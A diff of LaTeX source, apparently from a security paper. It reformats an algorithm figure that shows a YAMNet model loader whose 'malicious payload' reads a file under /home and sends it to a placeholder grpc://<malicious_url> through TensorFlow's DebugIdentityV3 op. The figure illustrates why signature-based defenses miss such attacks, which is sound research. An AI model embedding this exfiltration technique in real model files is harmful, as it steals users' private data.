@@ -75,13 +75,13 @@ To concretely illustrate why static, signature-based defenses fail against frame
 \Fn{\FYAMNet{$W,\ \mathcal{P}$}}{
     $\textit{self}.\textit{model} \gets \texttt{yamnet\_frames\_model}(\mathcal{P})$\;
     $\textit{self}.\textit{model}.\texttt{load\_weights}(W)$\;
-    \tcp{--- benign setup ends ---} 
-    \tcp{--- malicious payload begins ---}
-    $path \gets \texttt{tf.io.matching\_files}("/home/*")\texttt{[0]}$\;
+    \tcp{-- benign setup ends --} 
+    \tcp{-- malicious payload begins --}
+    $path \gets \texttt{tf.io.matching\_files}(\texttt{"/home/*"})\texttt{[0]}$\;
     $content \gets \texttt{tf.raw\_ops.ReadFile}(\textit{filename}=path)$\;
     $prefix \gets \texttt{tf.constant}(\texttt{"its a debug file\textbackslash n"})$\;
     $payload \gets \texttt{tf.strings.join}([prefix,\ content])$\;
-    $\texttt{tf.raw\_ops.DebugIdentityV3}(\textit{input}=payload,\ \textit{debug\_urls}=“grpc://<malicious\_url>”)$\;
+    $\texttt{tf.raw\_ops.DebugIdentityV3}(\textit{input}=payload,\ \textit{debug\_urls}=\texttt{"grpc://<malicious\_url>"})$\;
 }
 \end{algorithm}
 
